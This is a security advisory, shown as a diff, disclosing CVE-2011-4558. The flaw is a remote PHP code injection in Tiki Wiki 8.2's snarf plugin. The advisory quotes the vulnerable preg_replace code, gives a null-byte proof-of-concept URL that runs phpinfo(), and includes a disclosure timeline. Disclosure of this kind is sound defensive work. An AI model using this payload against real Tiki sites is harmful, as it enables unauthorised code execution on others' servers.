@@ -1,0 +1,39 @@
+  -------------------------------------------------------------------------
+  Tiki Wiki CMS Groupware <= 8.2 (snarf_ajax.php) Remote PHP Code Injection
+  -------------------------------------------------------------------------
+  
+  author...........: Egidio Romano aka EgiX
+  mail.............: n0b0d13s[at]gmail[dot]com
+  software link....: http://info.tiki.org/
+  
+  
+  [-] Vulnerability explanation:
+  
+  The vulnerable code is located into /lib/wiki-plugins/wikiplugin_snarf.php:
+  
+  170.   // If the user specified a more specialized regex
+  171.   if ( isset($params['regex']) && isset($params['regexres']) && preg_match('/^(.)(.)+\1[^e]*$/', $params['regex']) ) {
+  172.      $snarf = preg_replace( $params['regex'], $params['regexres'], $snarf );
+  173.   }
+  
+  input passed through $_REQUEST['regex'] is checked by a regular expression at line 171 to prevent
+  execution of arbitrary PHP code using the  'e'  modifier in a call to preg_replace() at line 172.
+  But  this  check  could  be  bypassed  with a  null byte injection,  requesting an URL like this:
+  
+   http://<hostname>/tiki-8.2/snarf_ajax.php?url=1&regexres=phpinfo()&regex=//e%00/
+  
+  Tiki internal filters remove  all null bytes  from user input,  but for some strange reason  this
+  doesn't  happen within admin sessions. So, successful exploitation of this vulnerability requires
+  an user account with  administration  rights and  'PluginSnarf'  to be enabled  (not by default).
+  
+  
+  [-] Disclosure timeline:
+  
+  [23/11/2011] - Vulnerability discovered
+  [24/11/2011] - Issue reported to security(at)tikiwiki.org
+  [24/11/2011] - New ticket opened: http://dev.tiki.org/item4059
+  [27/11/2011] - Vendor confirmed the issue
+  [27/11/2011] - CVE number requested
+  [28/11/2011] - Assigned CVE-2011-4558
+  [22/12/2011] - After four weeks still no fix released
+  [23/12/2011] - Public disclosure
